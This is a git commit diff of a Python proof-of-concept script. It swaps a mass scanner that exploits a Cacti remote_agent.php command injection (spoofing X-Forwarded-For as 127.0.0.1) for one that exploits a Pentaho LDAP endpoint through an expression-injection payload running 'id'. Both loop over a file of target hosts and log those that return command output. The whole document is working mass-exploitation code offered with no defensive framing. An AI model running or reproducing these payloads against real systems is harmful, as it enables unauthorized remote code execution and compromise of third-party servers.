1d631aba81fbda9035ec39043eaa328d4dd99e02
nethunterforum <132587227+nethunterforum@users.noreply.github.com>
2023-05-08 12:18:20 -0400

    Update phppoc.py

--- phppoc.py
+++ phppoc.py
@@ -1,29 +1,19 @@
 import requests
 import sys
 
-def main():
-    filea = sys.argv[1]
 
-    with open(filea, 'r') as file:
-        for line in file:
-            host = "http://"+line.strip()
-            headers = {
-                'X-Forwarded-For': '127.0.0.1'
-            }
-
-            try:
-                print("aaaa")
-                httpResponse = requests.get(host + '/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;id', headers=headers)
-                print(host)
-                if('uid=' in httpResponse.text and 'gid=' in httpResponse.text):
-                    with open('result2.txt', 'a') as file1:
-                        file1.write(host+'\n')
-                    file1.close()
-                if 'local_data_id' in httpResponse.text:
-                    print(f" [error] {host} appears to be vulnerable")
-            except:
-                a=0
-            
-
-if __name__ == '__main__':
-    main()
+with open("cacti.txt", 'r') as file:
+    for line in file:
+        baseurl = 'http://'+line+'/pentaho'
+        print(baseurl)
+        url = f"{baseurl}/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{{T(java.lang.Runtime).getRuntime().exec('id')}}&mgrDn=a&pwd=a"
+        try:
+            r = requests.get(url)
+            if r.text == 'false':
+                print ("command should've executed! nice.")
+            if('uid=' in r.text and 'gid=' in r.text):
+                with open('result2.txt', 'a') as file1:
+                    file1.write(baseurl+'\n')
+                file1.close()
+        except:
+            a=0
